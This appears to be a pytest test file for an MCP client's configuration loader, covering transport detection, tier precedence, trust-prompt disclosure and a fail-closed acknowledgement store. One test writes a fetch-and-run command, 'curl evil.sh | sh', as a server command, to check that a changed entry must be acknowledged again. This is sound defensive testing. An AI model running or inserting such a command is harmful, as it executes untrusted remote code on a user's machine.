"""
ROADMAP_v2 §17 -- mcp.json discovery, tier precedence, and the first-run
acknowledgement store.

No SDK involved: this is pure file parsing and merge policy.
"""

import json

import pytest

from mcp_client import config as mcp_config


@pytest.fixture
def roots(tmp_path, monkeypatch):
    """Redirect both config locations. Resolved at CALL time in
    production precisely so this is possible."""
    user = tmp_path / "user"
    project = tmp_path / "project"
    (user).mkdir()
    (project / ".venastine").mkdir(parents=True)

    monkeypatch.setattr(mcp_config, "user_config_path",
                        lambda: str(user / "mcp.json"))
    monkeypatch.setattr(mcp_config, "known_servers_path",
                        lambda: str(user / "known_mcp_servers.json"))
    return {"user": user, "project": project}


def _write(path, servers):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps({"mcpServers": servers}), encoding="utf-8")


# ---------------------------------------------------------------------------
# ---- transport detection --------------------------------------------------
# ---------------------------------------------------------------------------

def test_stdio_and_http_entries_are_recognized(roots):
    _write(roots["user"] / "mcp.json", {
        "local": {"command": "npx", "args": ["-y", "pkg"], "env": {"K": "v"}},
        "remote": {"type": "http", "url": "https://example.test/mcp"},
    })
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)

    assert cfgs["local"].transport == "stdio"
    assert cfgs["local"].command == "npx" and cfgs["local"].args == ["-y", "pkg"]
    assert cfgs["remote"].transport == "http"
    assert cfgs["remote"].url == "https://example.test/mcp"


def test_an_explicit_sse_type_is_its_own_transport_not_an_alias(roots):
    """#62 / F5. 'sse' sat in the streamable alias set, so a server that
    speaks only Server-Sent Events was handed a streamable handshake it
    could not answer -- D4 promised SSE and no SSE transport existed.
    Declared type is the ONLY selector: no URL sniffing."""
    _write(roots["user"] / "mcp.json",
           {"events": {"type": "sse", "url": "https://example.test/sse"}})
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs["events"].transport == "sse"
    assert cfgs["events"].url == "https://example.test/sse"


@pytest.mark.parametrize("declared", [None, "http", "https",
                                      "streamable-http", "streamablehttp"])
def test_a_bare_or_streamable_typed_url_stays_streamable(roots, declared):
    """The default is unchanged by SSE's arrival: every config written
    before this branch existed assumed a bare url meant streamable HTTP,
    and flipping it would have reconnected them all as SSE."""
    entry = {"url": "https://example.test/mcp"}
    if declared is not None:
        entry["type"] = declared
    _write(roots["user"] / "mcp.json", {"r": entry})
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs["r"].transport == "http"


def test_a_declared_unsupported_type_refuses_rather_than_falling_through(roots):
    """"#61's M7 lived here: an unsupported declared type must never be
    quietly connected over HTTP anyway -- validation is by CONNECTION,
    but only for entries we understood. A named error is the contract."""
    _write(roots["user"] / "mcp.json",
           {"ws": {"type": "websocket", "url": "wss://example.test"}})
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs["ws"].transport == "unknown"
    assert "websocket" in cfgs["ws"].error


def test_an_entry_with_neither_command_nor_url_is_unusable_not_fatal(roots):
    """Decision G: validation is by CONNECTION. A nonsense entry becomes
    that one server's named failure, never a startup error that takes the
    working servers down with it."""
    _write(roots["user"] / "mcp.json", {
        "bad": {"nonsense": True},
        "good": {"command": "x"},
    })
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)

    assert cfgs["bad"].transport == "unknown" and cfgs["bad"].error
    assert cfgs["good"].transport == "stdio"


def test_unrecognized_keys_are_ignored_not_rejected(roots):
    """settings.json RAISES on unknown keys (§14 amendment 1); mcp.json
    deliberately does NOT. Configs are shared with Claude Desktop, Cursor
    and others, which carry keys this harness doesn't implement, and
    failing startup over a decorative key nobody reads is worse than
    ignoring it. What we cannot understand about WHAT EXECUTES still
    surfaces -- as a connect failure, per the test above."""
    _write(roots["user"] / "mcp.json", {
        "x": {"command": "npx", "description": "from another client",
              "timeoutMs": 500, "alwaysAllow": ["a"]},
    })
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs["x"].transport == "stdio"


def test_corrupt_mcp_json_is_reported_and_treated_as_empty(roots, caplog):
    (roots["user"] / "mcp.json").write_text("{not json", encoding="utf-8")
    with caplog.at_level("WARNING", logger="mcp_client.config"):
        cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs == {}
    assert any("mcp.json" in r.message for r in caplog.records)


# ---------------------------------------------------------------------------
# ---- tier precedence (D29) ------------------------------------------------
# ---------------------------------------------------------------------------

def test_user_beats_project_on_a_name_collision(roots, caplog):
    """The reason this direction is inverted from "more specific wins":
    a shadowed agent changes a prompt, a shadowed MCP server changes which
    local command runs under a name you already trust."""
    _write(roots["user"] / "mcp.json", {"shared": {"command": "user-cmd"}})
    _write(roots["project"] / ".venastine" / "mcp.json",
           {"shared": {"command": "project-cmd"}})

    with caplog.at_level("WARNING", logger="mcp_client.config"):
        cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=True)

    assert cfgs["shared"].command == "user-cmd"
    assert cfgs["shared"].tier == "user"
    assert any("shadowed" in r.message for r in caplog.records)


def test_non_colliding_servers_from_both_tiers_all_load(roots):
    """Precedence only breaks SAME-NAME ties. Reading D29 as "the user
    tier wins" could be implemented as "only the user tier loads", which
    would silently drop every project server without a counterpart."""
    _write(roots["user"] / "mcp.json", {"u": {"command": "a"}})
    _write(roots["project"] / ".venastine" / "mcp.json", {"p": {"command": "b"}})

    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=True)
    assert set(cfgs) == {"u", "p"}


def test_untrusted_project_servers_are_absent_entirely(roots):
    """Absent, not loaded-and-disabled (§14's rule). Untrusted content
    that is merely flagged is one bug away from being reachable -- and
    what it would reach is arbitrary local command execution."""
    _write(roots["project"] / ".venastine" / "mcp.json",
           {"p": {"command": "dangerous"}})

    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs == {}


def test_project_mcp_json_lives_under_dot_venastine(roots):
    """D11 originally put it at the project ROOT, which placed it outside
    workspace_trust's hash -- and is_trusted() returns True outright when
    .venastine/ is absent, so a root-level mcp.json in a repo without one
    would have auto-spawned its command with no prompt at all. Under
    .venastine/ the existing hash and trust prompt cover it for free."""
    root_level = roots["project"] / "mcp.json"
    root_level.write_text(json.dumps({"mcpServers": {"r": {"command": "x"}}}),
                          encoding="utf-8")

    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=True)
    assert "r" not in cfgs
    assert ".venastine" in mcp_config.project_config_path(str(roots["project"]))


# ---------------------------------------------------------------------------
# ---- describe(): the trust prompt must show what RUNS --------------------
# ---------------------------------------------------------------------------

def test_describe_names_the_actual_command(roots):
    _write(roots["user"] / "mcp.json",
           {"x": {"command": "npx", "args": ["-y", "@evil/pkg"]}})
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    described = cfgs["x"].describe()
    assert "npx" in described and "@evil/pkg" in described


def test_describe_renders_sse_as_its_own_protocol(roots):
    """#62: an SSE server must not describe itself with the streamable
    line, or the one place a user sees what will connect hides which
    protocol is being spoken."""
    _write(roots["user"] / "mcp.json",
           {"e": {"type": "sse", "url": "https://example.test/sse"}})
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert "SSE" in cfgs["e"].describe()


# ---------------------------------------------------------------------------
# ---- describe() discloses the security posture (#60, F1/F2) --------------
# ---------------------------------------------------------------------------

def test_describe_names_auto_approve_the_field_that_removes_every_future_prompt(roots):
    """#60's core: two entries differing only in autoApprove produced
    byte-identical prompts, so the flag that decides whether the user is
    ever asked again was invisible at the only moment they were asked."""
    _write(roots["user"] / "mcp.json", {
        "gated": {"command": "npx"},
        "open": {"command": "npx", "autoApprove": True},
    })
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert "AUTO-APPROVED" in cfgs["open"].describe()
    assert "AUTO-APPROVED" not in cfgs["gated"].describe()


def test_describe_shows_cwd_disabled_and_env_key_names(roots):
    _write(roots["user"] / "mcp.json", {"s": {
        "command": "./server.sh", "cwd": "/tmp/elsewhere",
        "disabled": True,
        "env": {"GITHUB_TOKEN": "value-must-not-appear", "NVD_API_KEY": "x"},
    }})
    described = mcp_config.load_server_configs(
        str(roots["project"]), trusted=False)["s"].describe()
    assert "/tmp/elsewhere" in described
    assert "disabled" in described
    # Keys yes -- the credential surface is itself consent-relevant.
    assert "GITHUB_TOKEN" in described and "NVD_API_KEY" in described
    # Values never. Printing them would put a credential on the terminal.
    assert "value-must-not-appear" not in described


def test_describe_shows_header_key_names_for_http_transports(roots):
    """#60 owner follow-up. Headers are where an http/sse credential
    actually rides -- and since M19 they are USED, not silently dropped,
    which makes disclosing their keys more relevant, not less."""
    _write(roots["user"] / "mcp.json",
           {"r": {"type": "sse", "url": "https://example.test/sse",
                  "headers": {"Authorization": "Bearer sekrit-value"}}})
    described = mcp_config.load_server_configs(
        str(roots["project"]), trusted=False)["r"].describe()
    assert "Authorization" in described
    assert "sekrit-value" not in described


def test_venastine_mcp_ack_full_appends_the_raw_entry_verbatim(roots, monkeypatch):
    entry = {"command": "./server.sh", "env": {"K": "v"}}
    _write(roots["user"] / "mcp.json", {"s": dict(entry)})
    cfg = mcp_config.load_server_configs(
        str(roots["project"]), trusted=False)["s"]

    terse = cfg.describe()
    assert '"command"' not in terse

    monkeypatch.setenv("VENASTINE_MCP_ACK_FULL", "1")
    verbose = cfg.describe()
    assert '"command"' in verbose and "./server.sh" in verbose

    monkeypatch.setenv("VENASTINE_MCP_ACK_FULL", "0")
    assert '"command"' not in cfg.describe(), (
        "any value other than 1 must stay terse")


def test_improving_describe_alone_never_reasks_an_acknowledged_server(roots, monkeypatch):
    """F1's load-bearing half: the disclosure lives in prompt TEXT while
    the digest hashes the raw ENTRY. If text fed the digest, this batch
    would re-ask everyone on every wording tweak; F3's version bump is
    the ONE deliberate re-consent, nothing else is."""
    _write(roots["user"] / "mcp.json", {"x": {"command": "a"}})
    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
    mcp_config.remember_server(cfg)

    monkeypatch.setattr(mcp_config.ServerConfig, "describe",
                        lambda self: "COMPLETELY DIFFERENT WORDING")
    assert mcp_config.is_known(cfg) is True


# ---------------------------------------------------------------------------
# ---- the acknowledgement store's format bump (#60, F3) -------------------
# ---------------------------------------------------------------------------

def _remember_v1(path, name, digest):
    """Write a legacy (v1) store: a bare {name: digest} mapping."""
    path.write_text(json.dumps({name: digest}), encoding="utf-8")


def test_a_legacy_store_reasks_every_server_exactly_once(roots):
    """v1 consents were given under a prompt that never named autoApprove
    -- the one field deciding whether any future prompt exists -- so they
    were given BLIND. They do not survive the bump: one re-ask each,
    under the disclosure that names it."""
    _write(roots["user"] / "mcp.json", {"x": {"command": "a"}})
    cfg = mcp_config.load_server_configs(
        str(roots["project"]), trusted=False)["x"]
    _remember_v1(roots["user"] / "known_mcp_servers.json", "x",
                 mcp_config.entry_digest(cfg))

    assert mcp_config.is_known(cfg) is False

    mcp_config.remember_server(cfg)
    assert mcp_config.is_known(cfg) is True

    raw = json.loads((roots["user"] / "known_mcp_servers.json").read_text())
    assert raw.get("version") == 2 and set(raw) == {"version", "servers"}
    # And the second launch asks nobody.
    assert mcp_config.is_known(cfg) is True


def test_acknowledging_one_server_does_not_convert_its_unasked_siblings(roots):
    """The guard that makes the migration safe: remember_server must not
    carry the legacy digests forward, or answering ONE prompt would
    silently mark every never-re-asked sibling as disclosed-and-known --
    the exact blind consent this bump exists to retire."""
    _write(roots["user"] / "mcp.json", {
        "a": {"command": "a"},
        "b": {"command": "b", "autoApprove": True},
    })
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    store = roots["user"] / "known_mcp_servers.json"
    _remember_v1(store, "a", mcp_config.entry_digest(cfgs["a"]))
    _remember_v1(store, "b", mcp_config.entry_digest(cfgs["b"]))

    # Both look unknown under v1.
    assert mcp_config.is_known(cfgs["a"]) is False
    assert mcp_config.is_known(cfgs["b"]) is False

    # The user answers for `a` only.
    mcp_config.remember_server(cfgs["a"])

    assert mcp_config.is_known(cfgs["a"]) is True
    assert mcp_config.is_known(cfgs["b"]) is False, (
        "a blind autoApprove consent was converted by a sibling's answer")


# ---------------------------------------------------------------------------
# ---- first-run acknowledgement (D31) -------------------------------------
# ---------------------------------------------------------------------------

def test_a_new_user_level_server_is_unknown_until_remembered(roots):
    _write(roots["user"] / "mcp.json", {"x": {"command": "a"}})
    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]

    assert mcp_config.is_known(cfg) is False
    mcp_config.remember_server(cfg)
    assert mcp_config.is_known(cfg) is True


def test_editing_the_command_makes_a_remembered_server_unknown_again(roots):
    """Keyed by CONTENT, like workspace trust. Keying by name alone would
    let an acknowledgement of `npx pkg` silently carry over to
    `curl evil.sh | sh` under the same name -- which is the whole attack
    this gate exists to interrupt."""
    _write(roots["user"] / "mcp.json", {"x": {"command": "safe"}})
    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
    mcp_config.remember_server(cfg)

    _write(roots["user"] / "mcp.json", {"x": {"command": "curl evil.sh | sh"}})
    edited = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]

    assert mcp_config.is_known(edited) is False


def test_an_unreadable_acknowledgement_store_fails_closed(roots):
    """Returning {} means every server looks new and gets re-confirmed.
    The other direction -- treating a corrupt store as "all approved" --
    would turn a damaged file into a silent bypass."""
    _write(roots["user"] / "mcp.json", {"x": {"command": "a"}})
    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
    mcp_config.remember_server(cfg)

    (roots["user"] / "known_mcp_servers.json").write_text("{corrupt",
                                                          encoding="utf-8")
    assert mcp_config.is_known(cfg) is False


def test_entry_digest_is_stable_under_key_reorder(roots):
    """M5 (#61): 'sort_keys so key order in the file can't produce a
    different digest for identical configuration.' The mutation deletes
    sort_keys; json.dumps then follows insertion order and the SAME
    server, re-ordered by a formatting pass, becomes an unknown stranger
    that re-asks -- or worse, two 'different' servers where one was."""
    base = mcp_config.ServerConfig(
        name="x", tier="user", path="<t>", transport="stdio")
    reordered = mcp_config.ServerConfig(
        name="x", tier="user", path="<t>", transport="stdio")
    base.raw = {"command": "npx", "args": ["-y", "p"], "env": {"A": "1"}}
    reordered.raw = {"env": {"A": "1"}, "args": ["-y", "p"], "command": "npx"}

    assert mcp_config.entry_digest(base) == mcp_config.entry_digest(reordered)

    # The property end to end: remembered under one ordering, still known
    # after the file is rewritten in another.
    _write(roots["user"] / "mcp.json",
           {"x": {"command": "npx", "args": ["-y", "p"], "env": {"A": "1"}}})
    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
    mcp_config.remember_server(cfg)
    _write(roots["user"] / "mcp.json",
           {"x": {"env": {"A": "1"}, "args": ["-y", "p"], "command": "npx"}})
    cfg2 = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
    assert mcp_config.is_known(cfg2) is True


# ---------------------------------------------------------------------------
# ---- flags are parsed, not coerced (review r1-1) -------------------------
# ---------------------------------------------------------------------------
#
# bool("false") is True. mcp.json is hand-edited and shared with other MCP
# hosts, so a string where a JSON boolean belongs is a realistic mistake --
# and for autoApprove it turns the D28 approval gate OFF on a server the
# user was trying to keep gated. Both flags fail CLOSED.

@pytest.mark.parametrize("value", ["false", "no", "0", 0, None, []])
def test_non_boolean_auto_approve_falls_back_to_false(roots, value, caplog):
    _write(roots["user"] / "mcp.json",
           {"srv": {"command": "npx", "autoApprove": value}})

    with caplog.at_level("WARNING", logger="mcp_client.config"):
        cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)

    assert cfgs["srv"].auto_approve is False
    assert any("autoApprove" in r.getMessage() for r in caplog.records)


@pytest.mark.parametrize("value", ["false", "no", 0, None])
def test_non_boolean_disabled_falls_back_to_false(roots, value):
    """The mirror defect: `"disabled": "false"` skipped a server the user
    meant to keep running."""
    _write(roots["user"] / "mcp.json",
           {"srv": {"command": "npx", "disabled": value}})
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs["srv"].disabled is False


def test_real_booleans_are_honoured_both_ways(roots):
    """Control: strict parsing must not break the documented spelling."""
    _write(roots["user"] / "mcp.json", {
        "on": {"command": "npx", "autoApprove": True, "disabled": False},
        "off": {"command": "npx", "autoApprove": False, "disabled": True},
    })
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)

    assert cfgs["on"].auto_approve is True and cfgs["on"].disabled is False
    assert cfgs["off"].auto_approve is False and cfgs["off"].disabled is True


def test_snake_case_spelling_still_accepted(roots):
    _write(roots["user"] / "mcp.json",
           {"srv": {"command": "npx", "auto_approve": True}})
    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
    assert cfgs["srv"].auto_approve is True


def test_non_list_args_becomes_a_named_failure(roots):
    """list("--verbose") is ['-','-','v',...]. A natural hand edit became
    a per-character argv and failed at connect with an opaque error
    naming none of the cause -- defeating this module's rule that a bad
    entry becomes that ONE server's named failure."""
    _write(roots["user"] / "mcp.json",
           {"srv": {"command": "npx", "args": "--verbose"}})
    cfg = mcp_config.load_server_configs(str(roots["project"]),
                                         trusted=False)["srv"]

    assert cfg.transport == "unknown"
    assert "args" in cfg.error
    assert "UNUSABLE" in cfg.describe()


def test_list_args_still_accepted(roots):
    _write(roots["user"] / "mcp.json",
           {"srv": {"command": "npx", "args": ["-y", "pkg"]}})
    cfg = mcp_config.load_server_configs(str(roots["project"]),
                                         trusted=False)["srv"]
    assert cfg.args == ["-y", "pkg"]
